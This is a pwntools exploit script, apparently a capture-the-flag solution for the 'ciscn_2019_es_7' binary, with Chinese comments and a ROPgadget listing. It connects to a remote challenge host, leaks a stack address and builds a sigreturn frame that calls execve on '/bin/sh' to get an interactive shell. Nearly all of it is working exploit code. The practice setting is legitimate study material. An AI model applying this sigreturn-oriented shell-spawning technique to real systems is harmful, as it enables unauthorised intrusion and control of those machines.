from pwn import *
context(log_level='debug',os='linux',arch='amd64')

# io=process("./ciscn_2019_es_7")
io=remote("node4.buuoj.cn",26083)

sigreturn_addr=0x4004da #mov rax,0Fh
sys_read=0x4004ed
syscall_addr=0x400517
ret_addr=0x4003a9

payload=b"/bin/sh\x00"+p64(0)+p64(sys_read) #将/bin/sh写入栈上，同时返回地址设为sys_read以便后续构造payload
io.sendline(payload)
stack_addr=u64(io.recv()[0x20:0x28]) #sys_write额外泄露长度0x20，0x20到0x28为signalframe的stack_addr

print("stack_addr:   "+hex(stack_addr))


sigframe=SigreturnFrame()
sigframe.rax=constants.SYS_execve #execve系统调用号
sigframe.rdi=stack_addr-0x118 #execve参数1   我测，本地测出来偏移0x128能打通0x118不通，远端反着来
sigframe.rsi=0x0 #execve参数2
sigframe.rdx=0x0 #execve参数3
sigframe.rsp=stack_addr #指向被泄露地址
sigframe.rip=syscall_addr #让rip指向syscall位置

payload=b"/bin/sh\x00"+p64(0)+p64(sigreturn_addr)+p64(syscall_addr)+bytes(sigframe) 
io.sendline(payload)
io.interactive()



# Gadgets information
# ============================================================
# 0x000000000040059c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040059e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004005a0 : pop r14 ; pop r15 ; ret
# 0x00000000004005a2 : pop r15 ; ret
# 0x000000000040059b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040059f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x0000000000400440 : pop rbp ; ret
# 0x00000000004005a3 : pop rdi ; ret
# 0x00000000004005a1 : pop rsi ; pop r15 ; ret
# 0x000000000040059d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004003a9 : ret
# 0x0000000000400501 : syscall

# Unique gadgets found: 12